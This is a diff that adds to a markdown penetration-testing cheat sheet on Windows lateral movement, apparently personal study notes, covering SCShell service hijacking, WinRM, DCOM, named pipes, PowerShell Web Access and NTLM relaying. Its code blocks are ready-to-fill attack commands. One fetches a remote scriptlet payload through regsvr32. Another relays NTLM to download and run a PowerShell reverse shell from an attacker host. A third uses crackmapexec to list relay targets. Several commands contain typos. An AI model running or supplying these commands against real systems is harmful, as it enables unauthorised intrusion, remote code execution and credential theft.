@@ -417,3 +417,62 @@ sc.exe delete rdphijack
 
 #### Accessing RDP credentials
 - Complicated have to access ECPPTX again and try it out
+
+### ChangeServiceConfigA
+- https://github.com/SpiderLabs/SCShell
+- Uses DCERPC instead of SMB
+
+```
+SCShell.exe <TARGET> XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\refsvr32.exe /s /n /u /i://<PAYLOAD WEBSITE>/payload.sct scrobj.ddl" . <USER> <PASSWORD>
+SCShell.py
+```
+
+### WinRM
+- Uses WMI over HTTPS (P 5985 and 5986)
+- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs
+- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-6
+- https://github.com/Hackplayers/evil-winrm
+- https://github.com/bohops/WSMan-WinRM
+
+### DCOM
+- https://github.com/SecureAuthCorp/impacket dcom.exec.py
+- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
+
+### Named Pipes
+- https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-Pbind.ps1
+
+```
+Invoke-Pbing -Target <TARGET> -Domain <DOMAIN> -User <USER> -Password <PASSWORD>
+```
+
+### Powershell Web access
+#### Install Powershel web access on target
+```
+Install-WindowsFeature -Name WindowsPowerShellWebAccess
+Instal-PswaWebApplication -useTestCertificate
+Add-PswaAuthorizationRule -Username <USERNAME> -Computername <COMPUTER> -ConfigurationName <CONFIG NAME>
+```
+
+#### Browse to
+- https://<MACHINE NAME>/pswa
+
+### NTLM Relyaing
+- https://github.com/lgandx/Responder
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
+
+#### Crackmapexec list hosts with SMB signed disabled
+```
+crackmapexec smb <CIDR> --gen-relay-list <OUTPUT FILE>
+```
+
+- Edit Responder config file to disable HTTP server and SMB server
+
+#### Run NTLM Relay
+```
+ntlmrelay.py -t <TARGET> -c 'powershell.exe iex (New-Object.Net.Webclient).Downloadstring(\"http://<ATTACKER IP>/Invoke-PowerShellTcp.ps1\")"' -smb2support 
+```
+ 
+#### Run Responder
+```
+responder -I <INTERFACE> -v
+```
